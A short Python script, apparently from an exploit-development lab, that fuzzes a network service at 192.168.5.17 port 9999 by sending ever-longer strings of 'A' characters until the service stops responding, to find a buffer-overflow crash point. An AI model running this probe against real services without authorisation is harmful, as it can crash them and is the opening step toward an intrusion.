import socket
import sys
import time

count = 100
junk = 'A'

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.5.17',9999))
        print(s.recv(1024))
        print('Trying to buffer overflow with ' + str(count) + ' of ' + junk)
        s.send(junk * count)
        print(s.recv(1024))
        count = count + 100
        s.close()
        time.sleep(1)
    except Exception:
        sys.exit()
